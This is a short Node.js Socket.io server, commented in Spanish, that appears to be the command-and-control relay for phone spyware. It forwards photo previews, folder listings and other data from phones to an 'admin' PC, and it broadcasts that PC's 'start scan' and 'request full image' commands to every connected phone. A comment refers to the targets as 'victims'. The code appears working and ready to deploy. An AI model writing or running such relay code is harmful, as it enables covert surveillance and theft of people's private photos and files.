const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");

// Configuración para permitir archivos grandes (100MB)
const io = new Server(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('<h1>🌉 Servidor Puente Activo (Modo Electron)</h1>');
});

io.on('connection', (socket) => {
    console.log(`🔌 Nuevo socket conectado: ${socket.id}`);

    // --- 1. EL PC SE CONECTA ---
    socket.on('join_admin', () => {
        socket.join('admin_room');
        console.log("💻 PC Admin (Electron) se unió a la sala.");
    });

    // --- 2. EL CELULAR ENVÍA DATOS (EL TÚNEL) ---
    socket.on('usrData', (data) => {
        // AQUÍ ESTÁ LA CLAVE: No procesamos, solo REENVIAMOS al PC.
        // El servidor V9 fallaba aquí porque intentaba guardar en 'victims'.
        
        // Log para ver en Render si llegan datos
        if(data.dataType === 'preview_image') {
            console.log(`📸 Foto recibida del celular: ${data.name} -> Reenviando al PC...`);
        } else if (data.dataType === 'folder_list') {
            console.log(`📂 Lista de carpetas recibida -> Reenviando al PC...`);
        } else {
            console.log(`📦 Dato recibido (${data.dataType}) -> Reenviando al PC...`);
        }

        // Enviamos a la sala del PC
        io.to('admin_room').emit('data_from_phone', data);
    });

    // --- 3. EL PC ENVÍA ÓRDENES AL CELULAR ---
    socket.on('command_start_scan', (args) => {
        console.log("📡 Orden 'Start Scan' recibida del PC -> Enviando a todos los celulares");
        socket.broadcast.emit('command_start_scan', args);
    });

    socket.on('command_stop_scan', () => {
        console.log("🛑 Orden 'Stop Scan' reenviada");
        socket.broadcast.emit('command_stop_scan');
    });

    socket.on('request_full_image', (data) => {
        console.log(`🔍 PC pide foto HD: ${data.path}`);
        socket.broadcast.emit('request_full_image', data);
    });

    socket.on('disconnect', () => {
        console.log(`❌ Socket desconectado: ${socket.id}`);
    });
});

server.listen(PORT, () => {
  console.log(`🚀 Servidor Puente corriendo en puerto ${PORT}`);
});
